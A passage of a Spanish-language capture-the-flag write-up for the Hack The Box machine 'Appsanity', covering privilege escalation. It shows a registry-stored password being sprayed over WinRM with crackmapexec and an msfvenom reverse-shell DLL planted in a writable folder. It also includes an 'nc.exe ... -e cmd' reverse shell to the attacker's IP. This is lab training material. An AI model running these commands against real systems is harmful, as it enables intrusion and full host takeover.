</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x  4096 Mar  8 01:03 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 5 gunzf0x gunzf0x  4096 Mar  7 22:12 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 13824 Mar  8 01:03 ExaminationManagement.dll
</span></span></span></code></pre></div><p><em>Nota</em>: la conexi√≥n entre la reverse shell obtenida through mediante el archivo malicioso <code>.aspx</code> puede que muera cuando pasemos los archivos usando <code>netcat</code>, as√≠ que esto puede ser tedioso. De todas formas, aqu√≠ noto que el tama√±o del archivo <code>ExaminationManagement.dll</code> es el mismo tanto en la m√°quina v√≠ctima como en la m√≠a, de manera que se deber√≠a haber traspasado correctamente (para ser honesto me da flojera comprobar los hashes <code>md5</code>, de momento).</p><ul><li>Paso el archivo descargado de mi m√°quina Kali a una M√°quina Virtual con <code>Windows</code> dado que usar√© <code>dnSpy</code> (el cual podemos descargar <a href=https://github.com/dnSpy/dnSpy/releases class=external-link target=_blank rel=noopener>desde su repositorio de Github</a>) y hacer un poco de <code>Reverse Engineering</code> (Ingenier√≠a Inversa). Luego de analizar el archivo con <code>dnSpy</code> puedo ver algo aparentemente interesante en <code>ExaminationPanel -> ViewReport</code>:
<img src=/pentesting/images/Appsanity_13.png alt="Analyzing file with dnspy"></li><li>Este archivo <code>.dll</code> est√° llamando un registry key, el cual podr√≠a contener credenciales, a <code>Software\\MedDigi</code></li><li>Devuelta a la shell obtenida con el <code>SSRF</code> en el portal del sitio web, podemos intentar leer este registry key:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;reg query HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go>reg query HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HKEY_LOCAL_MACHINE\Software\MedDigi
</span></span></span><span class=line><span class=cl><span class=go>    EncKey    REG_SZ    1g0tTh3R3m3dy!!
</span></span></span></code></pre></div><p>y tenemos, aparentemente, una contrase√±a.</p><ul><li>No obstante, tenemos m√°s usuarios en esta m√°quina:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go>dir C:\Users
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  07:28 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  05:08 PM    &lt;DIR&gt;          Administrator
</span></span></span><span class=line><span class=cl><span class=go>09/24/2023  10:16 AM    &lt;DIR&gt;          devdoc
</span></span></span><span class=line><span class=cl><span class=go>09/15/2023  05:59 AM    &lt;DIR&gt;          Public
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  05:40 PM    &lt;DIR&gt;          svc_exampanel
</span></span></span><span class=line><span class=cl><span class=go>10/17/2023  02:05 PM    &lt;DIR&gt;          svc_meddigi
</span></span></span><span class=line><span class=cl><span class=go>10/18/2023  06:10 PM    &lt;DIR&gt;          svc_meddigiportal
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               8 Dir(s)   3,995,529,216 bytes free
</span></span></span></code></pre></div><p>de manera que guardo todos estos usuarios dentro de un archivo y uso <code>crackmapexec</code> para chequear si estas credenciales son v√°lidas para algunos de los usuarios via <code>WinRM</code> (dado que, recordemos, el scan de <code>Nmap</code> mostr√≥ que este servicio estaba disponible en la m√°quina).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ crackmapexec winrm 10.10.11.238 -u potential_users.txt -p &#39;1g0tTh3R3m3dy!!&#39; --continue-on-success
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.238    5985   NONE             [*] None (name:10.10.11.238) (domain:None)
</span></span></span><span class=line><span class=cl><span class=go>HTTP        10.10.11.238    5985   NONE             [*] http://10.10.11.238:5985/wsman
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\Administrator:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [+] None\devdoc:1g0tTh3R3m3dy!! (Pwn3d!)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_exampanel:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_meddigi:1g0tTh3R3m3dy!!
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.238    5985   NONE             [-] None\svc_meddigiportal:1g0tTh3R3m3dy!!
</span></span></span></code></pre></div><p>como podemos ver hemos encontrado las credenciales <code>devdoc:1g0tTh3R3m3dy!!</code></p><ul><li>Me logueo en la m√°quina v√≠ctima usando <code>evil-winrm</code> y la credencial encontrada, pero ahora impersonando al usuario <code>devdoc</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.238 -u devdoc -p &#39;1g0tTh3R3m3dy!!&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt;
</span></span></span></code></pre></div><ul><li>Luego de mirar archivos encuentro el directorio <code>C:\Program Files\ReportManagement</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Program Files\ReportManagement
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----        10/23/2023  11:33 AM                Libraries
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         9/17/2023   3:54 AM         140512 profapi.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM         179248 wldp.dll
</span></span></span></code></pre></div><ul><li>Noto que este directorio es curioso, dado que si quiero chequear su contenido como el usuario <code>svc_exampanel</code> (el usuario con el cual obuvimos previo acceso con la reverse shell), no podemos ver su contenido:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\windows\system32\inetsrv&gt;cd c:\program files
</span></span></span><span class=line><span class=cl><span class=go>cd c:\program files
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\Program Files&gt;cd ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>cd ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>Access is denied.
</span></span></span></code></pre></div><p>dado que si chequeamos los permisos de este directorio con <code>icacls</code> tenemos que:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Program Files&gt;icacls ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>icacls ReportManagement
</span></span></span><span class=line><span class=cl><span class=go>ReportManagement CREATOR OWNER:(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 BUILTIN\Administrators:(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 BUILTIN\Users:(OI)(CI)(R)
</span></span></span><span class=line><span class=cl><span class=go>                 APPSANITY\devdoc:(RX)
</span></span></span><span class=line><span class=cl><span class=go>                 NT SERVICE\TrustedInstaller:(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>y, como ya vimos previamente, <code>devdoc</code> en efecto puede leer el contenido de este directorio</p><ul><li>Devuelta a la consola con <code>evil-winrm</code>, descargo uno de los archivos <code>.exe</code>; llamado <code>ReportManagement.exe</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Program Files\ReportManagement&gt; download ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Downloading C:\Program Files\ReportManagement\ReportManagement.exe to ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Download successful!
</span></span></span></code></pre></div><ul><li>Usar√© <code>Ghidra</code> para decompilar este binario. Luego de una laaarga b√∫squeda, al fin puedo ver algo:
<img src=/pentesting/images/Appsanity_14.png alt="Analyze with Ghidra"></li><li>Noto que este programa crea un backup/respaldo en el directorio <code>C:\Users\Administrator\Backup</code>:
<img src=/pentesting/images/Appsanity_15.png alt="Executable creates a backup"></li><li>Y encuentro algunas instrucciones interesantes:
<img src=/pentesting/images/Appsanity_16.png alt="Instructions for binary">
de manera que, aparentemente, el archivo llama un archivo localizado en <code>C:\Users\Program Files\ReportManagement\Libraries</code> para un comando llamado <code>upload</code>. Es m√°s, este archivo aparentemente se llama <code>externalupload.dll</code>:
<img src=/pentesting/images/Appsanity_17.png alt="File being called"></li><li>Chequeo si puedo crear archivos dentro del directorio <code>Libraries</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement&gt; ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\program files\ReportManagement
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----        10/23/2023  11:33 AM                Libraries
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          34152 cryptbase.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM          83744 cryptsp.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM         564112 msvcp140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         9/17/2023   3:54 AM         140512 profapi.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   2:56 PM         102912 ReportManagement.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        10/20/2023   1:47 PM       11492864 ReportManagementHelper.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          96144 vcruntime140.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----         3/11/2021   9:22 AM          36752 vcruntime140_1.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----          5/5/2023   5:21 AM         179248 wldp.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement&gt; icacls Libraries
</span></span></span><span class=line><span class=cl><span class=go>Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Administrators:(I)(F)
</span></span></span><span class=line><span class=cl><span class=go>          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go>          BUILTIN\Users:(I)(OI)(CI)(R)
</span></span></span><span class=line><span class=cl><span class=go>          NT SERVICE\TrustedInstaller:(I)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><p>y, como el usuario <code>devdoc</code>, podemos.</p><ul><li>Si chequeo qu√© puertos internos est√°n abiertos en la m√°quina encuentro uno que no es muy com√∫n:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; cmd /c &#39;netstat -an | find &#34;LISTENING&#34;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:100            0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  &lt;SNIP&gt;
</span></span></span></code></pre></div><p>Hay un servicio corriendo internamente en el puerto <code>100</code></p><ul><li>Primero, noto que este servicio no es un sitio web (o algo relacionado):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; cmd /c curl http://127.0.0.1:100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cmd.exe :   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span></span><span class=line><span class=cl><span class=go>    + CategoryInfo          : NotSpecified: (  % Total    % ...  Time  Current:String) [], RemoteException
</span></span></span><span class=line><span class=cl><span class=go>    + FullyQualifiedErrorId : NativeCommandError
</span></span></span><span class=line><span class=cl><span class=go>                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (1) Received HTTP/0.9 when not allowed
</span></span></span></code></pre></div><ul><li>No soy capaz de re-usar el binario <code>netcat</code> para <code>Windows</code> que hab√≠a usado para descargar el archivo <code>ExaminationManagement.dll</code> previamente, esto dado que el directorio <code>C:\Users\Public\Downloads</code> me deniega el acceso como el usuario <code>devdoc</code> (lo cual es rarete, pero bueno&mldr;), de manera que vuelvo a subir un binario de <code>netcat</code> en <code>C:\Users\devdoc\Downloads</code>.</li><li>Ahora uso este binario re-subido de <code>netcat</code>, pero esta vez como objetivo el <code>localhost</code> en el puerto <code>100</code> y obtengo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span></code></pre></div><p>de manera que, aparentemente, el binario que decompilamos previamente es el servicio corriendo en el puerto <code>100</code>. Pero si typeo/escribo <code>help</code> en la consola (tal cual sugiere el mismo servicio) el programa se cuelga/no responde.</p><ul><li>Adicionalmente necesitamos una manera de &ldquo;activar&rdquo; este servicio corriendo en el puerto <code>100</code> y, adem√°s, crear un archivo <code>dll</code> malicioso.</li><li>Usando <code>msfvenom</code> ahora creo un archivo malicioso <code>dll</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f dll -o externalupload.dll
</span></span></span></code></pre></div><p>en la m√°quina v√≠ctima voy a <code>C:\Program Files\ReportManagement\Libraries</code> y subo el archivo malicioso:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt; cd C:\&#39;program files&#39;\ReportManagement\Libraries
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\program files\ReportManagement\Libraries&gt; upload ../exploits/externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Hard/Appsanity/content/../exploits/externalupload.dll to C:\program files\ReportManagement\Libraries\externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 12288 bytes of 12288 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><ul><li>Ahora, tenemos 2 opciones: i) Intentar un <code>Remote Port Forwarding</code> para convertir/redirigir el tr√°fico del puerto <code>100</code> desde la m√°quina v√≠ctima a alg√∫n puerto de nuestra m√°quina atacante o, ii) M√°s simple, noto que si corro <code>nc.exe</code> contra <code>localhost</code> desde la consola de <code>evil-winrm</code>, la cual es una consola con <code>Powershell</code>, esto no funciona muy bien; de manera que cuando llamamos ejecutamos <code>nc.exe 127.0.0.1 100</code> la consola no responde. Como sea, si me lanzo una reverse shell desde <code>evil-winrm</code> a un listener de <code>netcat</code> para pasar de <code>Powershell</code> a una <code>CMD</code> noto que correr <code>nc.exe</code> contra el <code>localhost</code> funciona bien. De manera procedo a correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\devdoc\Documents&gt; C:\Users\devdoc\Downloads\nc.exe 10.10.16.6 444 -e cmd
</span></span></span></code></pre></div><p>y cambio de una consola <code>Powershell</code> a una <code>CMD</code>, donde, de nuevo, puedo correr <code>127.0.0.1:100</code> sin problemas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 444
</span></span></span><span class=line><span class=cl><span class=go>listening on [any] 444 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51547
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Documents&gt;cd ..\Downloads
</span></span></span><span class=line><span class=cl><span class=go>cd ..\Downloads
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Downloads&gt;.\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go>.\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span><span class=line><span class=cl><span class=go>help
</span></span></span><span class=line><span class=cl><span class=go>Available Commands:
</span></span></span><span class=line><span class=cl><span class=go>backup: Perform a backup operation.
</span></span></span><span class=line><span class=cl><span class=go>validate: Validates if any report has been altered since the last backup.
</span></span></span><span class=line><span class=cl><span class=go>recover &lt;filename&gt;: Restores a specified file from the backup to the Reports folder.
</span></span></span><span class=line><span class=cl><span class=go>upload &lt;external source&gt;: Uploads the reports to the specified external source.
</span></span></span></code></pre></div><ul><li>Finalmente, empiezo un listener con <code>netcat</code> en el puerto <code>443</code> (el mismo que he definido cuando me hab√≠a creado el archivo malicioso <code>.dll</code>). En la m√°quina v√≠ctima procedo a correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\program files\ReportManagement\Libraries&gt;dir
</span></span></span><span class=line><span class=cl><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is F854-971D
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\program files\ReportManagement\Libraries
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>03/07/2024  10:27 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  10:27 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>03/07/2024  10:27 PM             9,216 externalupload.dll
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)          9,216 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   3,994,132,480 bytes free
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\program files\ReportManagement\Libraries&gt;C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\devdoc\Downloads\nc.exe 127.0.0.1 100
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Reports Management administrative console. Type &#34;help&#34; to view available commands.
</span></span></span><span class=line><span class=cl><span class=go>help
</span></span></span><span class=line><span class=cl><span class=go>Available Commands:
</span></span></span><span class=line><span class=cl><span class=go>backup: Perform a backup operation.
</span></span></span><span class=line><span class=cl><span class=go>validate: Validates if any report has been altered since the last backup.
</span></span></span><span class=line><span class=cl><span class=go>recover &lt;filename&gt;: Restores a specified file from the backup to the Reports folder.
</span></span></span><span class=line><span class=cl><span class=go>upload &lt;external source&gt;: Uploads the reports to the specified external source.
</span></span></span><span class=line><span class=cl><span class=go>upload externalupload.dll
</span></span></span></code></pre></div><ul><li>Y en mi listener de <code>netcat</code> finalmente obtengo:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.238] 51557
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.19045.3570]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files\ReportManagement&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>appsanity\administrator
</span></span></span></code></pre></div><p>donde podemos obtener la flag en el escritorio del usuario <code>Administrator</code></p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>